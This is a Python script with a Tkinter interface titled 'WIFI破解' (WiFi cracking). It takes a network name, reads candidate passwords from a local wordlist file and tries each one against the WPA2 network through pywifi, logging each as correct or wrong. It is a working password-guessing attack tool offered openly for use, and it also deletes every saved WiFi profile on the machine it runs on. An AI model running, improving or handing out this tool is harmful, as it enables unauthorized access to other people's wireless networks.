from tkinter import *
import pywifi
from pywifi import const
import pywifi
import time

#导入模块
#获取第一个无线网卡
#断开所有的wifi
#读取密码本
#设置睡眠时间

#测试连接函数
def wificonnect(str,wifiname):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    #print(ifaces.name())
    ifaces.disconnect()
    time.sleep(1)

    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = wifiname
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#加密算法
        #wifi的密码
        profile.key = str
        #网卡的开发
        profile.auth = const.AUTH_ALG_OPEN
        #删除所有的wifi文件
        ifaces.remove_all_network_profiles()
        #设定新的连接文件
        tmp_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tmp_profile)
        time.sleep(4)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已经连接")


def readPwd():
    #获取wifi名称
    wifiname = entry.get()            #获取文本框输入的WiFi账号
    #print(wifiname)
    path = r"D:\4399\default.txt"
    file = open(path,"r")
    while True:
        try:
            #读取密码本
            mystr = file.readline()
            #print(mystr)
            if mystr == "":
                break
            else:
                #print(mystr)
                #测试链接
                bool = wificonnect(mystr,wifiname)    # 调用账号和密码匹配函数
                if mystr == const.IFACE_CONNECTED:
                    bool = True
                if bool:
                    #print("密码正确",mystr)
                    text.insert(END,"密码正确"+mystr)
                    text.see(END)
                    text.update()

                else:
                    #print("密码错误",mystr)
                    text.insert(END,"密码错误"+mystr)
                    text.see(END)
                    text.update()

        except:
            #跳出当前循环，继续下一次循环
            continue


#创建窗口
root = Tk()

#窗口的标题
root.title("WIFI破解")
#窗口的大小  小写的x  #窗口的位置
root.geometry('500x400+550+260')

#标签控件
label = Label(root,text = '输入要破解的wifi名称:')
#位置  定位 网格布局  pack 包  place 位置
label.grid()

#输入控件
entry = Entry(root,font = ('微软雅黑',20))
entry.grid(row = 0,column = 1)


#列表框控件 columnspan 组件所跨越的列数
text = Listbox(root,font = ('微软雅黑',15),width = 40,height = 10)
text.grid(row = 1,columnspan = 2)

#按钮
button = Button(root,text = '开始破解',width = 20,height=2,command = readPwd)   #   点击按钮触发事件
button.grid(row = 2,columnspan = 2)


#显示窗口  消息循环
root.mainloop()

